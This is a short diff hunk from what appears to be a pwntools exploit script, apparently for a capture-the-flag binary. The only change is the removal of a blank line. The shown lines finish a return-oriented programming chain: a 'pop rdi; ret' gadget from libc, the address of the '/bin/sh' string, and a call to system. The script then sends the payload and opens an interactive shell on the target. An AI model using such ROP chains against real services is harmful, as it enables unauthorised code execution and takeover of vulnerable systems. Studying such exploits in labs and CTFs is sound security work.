@@ -55,7 +55,6 @@ payload = b''.join([
     # 0x000000000002a3e5: pop rdi; ret;
     p64(libc.address + 0x000000000002a3e5),p64(next(libc.search(b'/bin/sh'))),
     p64(libc.sym['system'])
-
 ])
 p.sendline(payload)
 p.interactive()
